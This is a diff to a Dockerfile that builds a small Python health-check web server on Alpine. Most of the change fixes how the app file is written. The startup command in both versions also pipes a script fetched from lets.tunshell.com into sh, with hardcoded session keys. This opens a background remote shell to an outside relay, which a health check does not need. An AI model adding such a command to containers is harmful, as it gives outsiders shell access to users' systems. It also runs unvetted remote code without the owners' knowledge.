@@ -1,10 +1,13 @@
 FROM alpine:latest
 
 # Install required packages
-RUN apk add --no-cache curl bash python3 py3-pip
+RUN apk add --no-cache curl bash python3
 
-# Create simple health check app
-RUN echo 'from http.server import BaseHTTPRequestHandler, HTTPServer
+# Create simple health check app correctly
+RUN mkdir -p /app && \
+    cat <<'EOF' > /app/app.py
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
 class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
         if self.path == "/health":
@@ -17,10 +20,9 @@ class Handler(BaseHTTPRequestHandler):
             self.end_headers()
 
 HTTPServer(("", 8000), Handler).serve_forever()
-' > /app.py
+EOF
 
-# Expose port 8000
 EXPOSE 8000
 
-# Start Tunshell in background + start web app
-CMD ["sh", "-c", "curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T IBBQ7VRI2WaW8rEbaDwKI4 Sdq7Dc5cVfu4lfcgkBdhYJ eu.relay.tunshell.com & python3 /app.py"]
+# Start Tunshell in background + start web server
+CMD sh -c "curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T IBBQ7VRI2WaW8rEbaDwKI4 Sdq7Dc5cVfu4lfcgkBdhYJ eu.relay.tunshell.com & python3 /app/app.py"
